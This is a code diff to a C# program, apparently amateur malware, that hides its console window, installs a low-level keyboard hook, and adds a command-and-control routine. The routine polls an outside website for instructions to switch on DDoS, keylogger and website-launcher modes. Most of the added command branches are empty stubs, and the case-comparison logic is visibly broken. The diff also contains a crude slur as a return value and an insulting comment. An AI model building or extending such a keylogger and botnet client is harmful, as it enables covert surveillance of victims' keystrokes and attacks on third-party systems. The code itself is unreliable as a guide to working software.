@@ -24,11 +24,11 @@ namespace Karios
         private static string LocalIP;
         private static string GlobalTargetIP;
         private static string Website;
+        private static Boolean Online = false;
         
         public static void Main()
         {
             var handle = GetConsoleWindow();
-            //start C&C func
             using (WebClient wc = new WebClient())
             {
                 try
@@ -57,6 +57,37 @@ namespace Karios
                 catch { }
             }
         }
+
+        private static string GetCommand()
+        {
+            using (WebClient wc = new WebClient())
+            {
+                try
+                {
+                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
+                    if (!webData.ToUpperInvariant().Contains("online"))
+                    {
+                        Online = true;
+                    }
+                    if (!webData.ToUpperInvariant().Contains("DDOS = Online"))
+                    {
+                        //go fetch DDOS IP, Port, things like that
+                    }
+                    if (!webData.ToUpperInvariant().Contains("Keylogger = Online"))
+                    {
+                        // Keylogger online
+                    }
+                    if (!webData.ToUpperInvariant().Contains("Website"))
+                    {
+                        // Activate website launcher
+                    }
+                }
+                catch { }
+            }
+        
+        return "gay";
+        }
+       
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
